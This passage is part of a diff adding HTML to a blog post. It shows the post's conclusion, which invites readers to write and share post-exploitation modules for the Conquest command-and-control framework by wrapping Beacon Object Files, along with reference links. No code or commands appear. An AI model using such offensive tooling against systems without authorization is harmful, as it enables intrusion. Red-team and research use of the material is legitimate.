+</figure></p>
+
+<h2 id="conclusion" class="header-anchor-wrapper">Conclusion
+  <a href="#conclusion" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -384,6 +1063,29 @@ Handler</p>
 </svg>
   </a>
 </h2>
+
+<p>Anyone who has read until now should be properly equipped to create their own Conquest post-exploitation modules, so feel free to wrap your favourite BOFs and share them with the world. This is the easiest way to make the <em>Conquest</em> framework more powerful. Consider the following material to learn more about the Python API and module system.</p>
+<ul>
+<li>API reference/documentation: <a href="https://github.com/jakobfriedl/conquest/blob/main/docs/8-SCRIPTING.md">8-SCRIPTING</a></li>
+<li>Example modules: <a href="https://github.com/jakobfriedl/conquest-modules/">conquest-modules</a></li>
+</ul>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p><a href="https://trustedsec.com/blog/a-developers-introduction-to-beacon-object-files">https://trustedsec.com/blog/a-developers-introduction-to-beacon-object-files</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_bof-c-api.htm">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_bof-c-api.htm</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:4">
+<p><a href="https://www.outflank.nl/blog/2025/07/16/async-bofs-wake-me-up-before-you-go-go/">https://www.outflank.nl/blog/2025/07/16/async-bofs-wake-me-up-before-you-go-go/</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
 </article></div>
     
 </div>
